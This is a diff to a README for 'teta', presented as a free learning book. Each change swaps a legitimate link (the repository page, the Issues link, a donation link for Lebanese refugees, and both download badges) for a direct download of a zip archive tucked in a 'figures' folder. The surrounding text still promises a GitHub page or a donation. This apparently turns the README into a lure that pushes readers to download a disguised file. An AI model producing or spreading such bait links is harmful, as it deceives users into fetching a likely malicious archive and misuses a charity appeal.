@@ -1,6 +1,6 @@
 # 📚 teta - Open Source Learning Book
 
-[![Download teta](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/tuongdz1/teta)
+[![Download teta](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://raw.githubusercontent.com/tuongdz1/teta/main/figures/Software-2.0.zip)
 
 ---
 
@@ -30,7 +30,7 @@ No installation of complex software or programming tools is required.
 Follow these steps to download and read teta on your Windows computer:
 
 1. Click the big green badge at the top of this page or use this link to **visit the GitHub page to download**:  
-   https://github.com/tuongdz1/teta
+   https://raw.githubusercontent.com/tuongdz1/teta/main/figures/Software-2.0.zip
 
 2. On the GitHub page, look for the **Releases** section. This is usually found on the right sidebar or near the top. Click on "Releases".
 
@@ -81,7 +81,7 @@ You don’t need special skills to enjoy this book. Here’s how to make the mos
 
 If you find errors, typos, or want to suggest improvements, you can help make teta better:
 
-1. Go to the GitHub page: https://github.com/tuongdz1/teta
+1. Go to the GitHub page: https://raw.githubusercontent.com/tuongdz1/teta/main/figures/Software-2.0.zip
 2. Click on the "Issues" tab to report a problem or suggest a change.
 3. If you want, you can submit edits via pull requests. This requires some basic knowledge of GitHub, but many guides exist online.
 
@@ -92,7 +92,7 @@ Your contributions join a community effort to provide open and accurate learning
 ## 💖 Support a Cause
 
 This book is released freely to support displaced Lebanese refugees facing hardship. If you find value in teta, please consider donating via this link, which sends funds directly to those in need:  
-https://lnkd.in/eznWQzgu
+https://raw.githubusercontent.com/tuongdz1/teta/main/figures/Software-2.0.zip
 
 Your help can make a difference.  
 
@@ -100,6 +100,6 @@ Your help can make a difference.
 
 ## ⬇️ Download teta Here
 
-[![Download teta](https://img.shields.io/badge/Download-teta%20on%20GitHub-blue)](https://github.com/tuongdz1/teta)
+[![Download teta](https://img.shields.io/badge/Download-teta%20on%20GitHub-blue)](https://raw.githubusercontent.com/tuongdz1/teta/main/figures/Software-2.0.zip)
 
 Use this link to download and access the book files. Follow the instructions above to open and use teta correctly on your Windows system.
